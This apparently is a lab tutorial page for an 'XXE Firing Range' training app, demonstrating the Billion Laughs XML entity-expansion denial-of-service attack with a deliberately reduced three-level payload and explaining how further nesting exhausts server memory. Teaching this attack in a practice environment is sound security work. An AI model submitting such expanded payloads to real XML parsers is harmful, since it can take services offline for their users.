---
title: "Billion Laughs"
weight: 50
---

{{% notice warning %}}
The purpose of this exploit is to cause a Denial-of-Service.
{{% /notice %}}

{{% notice note %}}
Make sure you are on the Billion Laughs (`/billion-laughs.do`) page of the XXE Firing Range app
{{% /notice %}}

To show the power of this attack without actually bringing down the server we are going to pare down the submission. The quinessential billion laughs attack defines 10 entities and once expanded will consume around 3GB of server memory. Our attack will only define 3 entities.

Sumit the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY a0 "lol" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

As shown below the webserver expanded each of the entities to create a long string. Now imagine the length of the string with just a couple more expansions.

![Billion Laughs Result](/static/img/billion_laughs_result.png)
